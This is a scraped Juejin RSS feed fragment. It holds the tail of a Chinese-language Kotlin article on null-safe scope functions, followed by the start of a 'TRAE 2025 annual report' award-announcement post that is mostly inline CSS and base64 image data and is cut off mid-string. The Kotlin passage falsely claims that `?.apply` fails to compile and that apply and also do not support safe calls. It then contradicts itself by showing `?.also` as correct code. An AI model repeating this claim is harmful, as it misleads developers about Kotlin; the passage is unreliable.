<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 错误：无法编译</span>
<span class="hljs-comment">// nullableString?.apply { ... }</span>

<span class="hljs-comment">// 正确：使用 run 替代</span>
nullableString?.run {
    println(length)  <span class="hljs-comment">// 这里 this 是非空的</span>
}

<span class="hljs-comment">// 正确：使用 let 替代 also</span>
nullableString?.let { str -&gt;
    println(str.length)  <span class="hljs-comment">// str 是非空的</span>
    <span class="hljs-comment">// 如果需要返回原对象，可以最后写 str</span>
    str
}

<span class="hljs-comment">// 正确：明确处理空值</span>
nullableString?.also { 
    <span class="hljs-comment">// 这里 it 是非空的</span>
    println(it)
} ?: run {
    println(<span class="hljs-string">"值为空"</span>)
}
</code></pre>
<p>总结来说，<code>apply</code> 和 <code>also</code> 不支持空安全调用是 Kotlin 语言设计的有意选择，目的是保持函数职责的清晰。当你需要空安全的作用域函数时，应该使用 <code>let</code> 或 <code>run</code> 配合安全调用操作符。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE 2025 年度报告分享活动｜获奖名单公示🎊]]></title>    <link>https://juejin.cn/post/7592058763985911854</link>    <guid>https://juejin.cn/post/7592058763985911854</guid>    <pubDate>2026-01-06T08:13:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592058763985911854" data-draft-id="7592088192506839094" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE 2025 年度报告分享活动｜获奖名单公示🎊"/> <meta itemprop="keywords" content="前端,后端,人工智能"/> <meta itemprop="datePublished" content="2026-01-06T08:13:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金酱"/> <meta itemprop="url" content="https://juejin.cn/user/1556564194374926"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE 2025 年度报告分享活动｜获奖名单公示🎊
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1556564194374926/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:13:07.000Z" title="Tue Jan 06 2026 08:13:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa2louWolai3UqtE6qyWjoWgWNBYtl7aBdoJ2l/ZlmsE05jTetLXTGqb1TBvV1tP21+Zpl2k3avdqf9Gh6wTr5Ohs0mnWeaKL1rXRnaW7QHeX7mXd13qaet56HL0yvRN6D/VhfRv9WP3F+nv1b+qPGBgahBqIDLYbXDR4bUgz9DfMNtxieM5wyIhq5GskMNpidN7oJV2LzqTn0qvol+jDxvrGYcZS4z3GncZjJpYmCSYrTRpNnpgSTRmmmaZbTNtNh82MzKLMis3qzR6aE8wZ5nzzbeYd5qMWlhZJFqstmi0GLbUtWZZFlvWWj60oVn5W+Va1VnessdYM6xzrndZdNrCNmw3fpsbmli1s624rsN1p222HsfO0E9rV2t2zJ9sz7Qvt6+37HGgOkQ4rHZod3kw3m546fdP0junfHd0ccx33OT5y0nAKd1rp1Or0ztnGmeNc43zHheIS4rLMpcXlrautK891l+t9N6pblNtqt3a3b+4e7mL3BvchDzOPdI8dHvcYmowYxjrGVU+MZ4DnMs8znp+93L0KvE54/eFt753jfdh7cIblDN6MfTP6fUx82D57fGS+dN903598ZX7Gfmy/Wr9n/qb+XP8D/i+Y1sxs5hHmmwDHAHHAqYDRQK/AJYFtQaig0KCyoM5gjeCE4OrgpyEmIVkh9SHDoW6hi0PbwjBhEWGbwu6xDFgcVh1rONwjfEn4pQhyRFxEdcSzSJtIcWRrFBwVHrU56vFM85nCmc3RIJoVvTn6SYxlTH7ML7Ows2Jm1cx6HusUWxzbEUeNmxd3OO5jfED8hvhHCVYJ0oT2RNXEtMS6xNGkoKSKJFny9OQlyTdSdFMEKS2puNTE1AOpI7ODZ2+dPZDmllaadneO5ZyFc67N1Z2bO/fsPNV57Hkn0zHpSemH07+yo9m17JEMVsaOjGFOIGcb5xXXn7uFO8Tz4VXwXmT6ZFZkDmb5ZG3OGuL78Sv5rwWBgmrB2+yw7N3ZoznROQdz5LlJuY15+Lz0vNNCDWGO8NJ8w/kL53eLbEWlIlm+V/7W/GFxhPiABJLMkbQUaCIi6abUSvqDtK/Qt7Cm8NOCxAUnF6ovFC68uchm0dpFL4pCivYvRi/mLG4vNi5eUdy3hLlkz1JoacbS9mWmy0qWDSwPXX5oBXFFzopfVzqurFj5YVXSqtYSg5LlJf0/hP5QX6pSKi69t9p79e416DWCNZ1rXdZuX/u9jFt2vdyxvLL86zrOuus/Ov1Y9aN8feb6zg3uG3ZtxG4Ubry7yW/ToQr1iqKK/s1Rm5u20LeUbfmwdd7Wa5Wulbu3EbdJt8mqIqtatptt37j9azW/urcmoKZxh/6OtTtGd3J39uzy39Ww22B3+e4vPwl+ur8ndE9TrUVt5V7s3sK9z/cl7uvYz9hfd0D3QPmBbweFB2WHYg9dqvOoqzusf3hDPVwvrR86knak62jQ0ZYG+4Y9jbTG8mPgmPTYy+Ppx++eiDjRfpJxsuFn8593nKKeKmuCmhY1DTfzm2UtKS3dp8NPt7d6t576xeGXg2eMz9Sc1Tq74RzxXMk5+fmi8yNtorbXF7Iu9LfPa390MfninUuzLnVejrh89UrIlYsdzI7zV32unrnmde30dcb15hvuN5puut089avbr6c63Tubbnncauny7GrtntF9rsev58LtoNtX7rDu3Oid2dt9N+Hu/Xtp92T3ufcHH+Q+ePuw8OHYo+WPMY/Lnqg9qXyq/7T2N+vfGmXusrN9QX03n8U9e9TP6X/1u+T3rwMlzynPK18YvagbdB48MxQy1PVy9suBV6JXY69L/6H+jx1vrN78/If/HzeHk4cH3orfyt+te6/z/uAH1w/tIzEjTz/mfRwbLfuk8+nQZ8bnji9JX16MLfiK+1r1zfpb6/eI74/leXK5iC1mj0sBFDLgzEwA3h1EtHEKAFRElxNnT2jrcYMmvgfGCfwnntDf4+YOQAMyKWQR0x+Akwo5i8wqyKyQRPH+AHZxUY5/mSTTxXkiFxlRlphPcvl7AwBwrQB8E8vlYzvl8m/7kGIfANCWP6HpFYZFtHyD3vJRg6LbPe3g7zah9//U499noKjAFfx9/ieoZhkWVvYkwwAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAEKgAwAEAAAAAQAAAEIAAAAAgodoEQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAABMtJREFUeAHtXM2KFDEQzrQKruIu4mEXRFlUVLz4A4K7B99AcO8io0/gwQfxDVzFuwu+gQf34EG8iOAPKAh6EFlBFMSf/qa2uqszlVR6ZtYxM5PDJNVVSer78nU6KrHzpyxuVlwx44AY2O0T8eb9D7f5fMu9fPvdff7y0/36nbdgdhUdd+jgHnf62JxbObvgjh/d60Pu2R35ajx49Mk9frqlBk7Kw8sXF9y1K4t9cCoi7tz/4F68/tYXMIkPzpzY725dP9yA1tsjoIRpIQHogRWYZSmwJ4Reh06nI2Nd7rYEA8zAzqXAxhgq/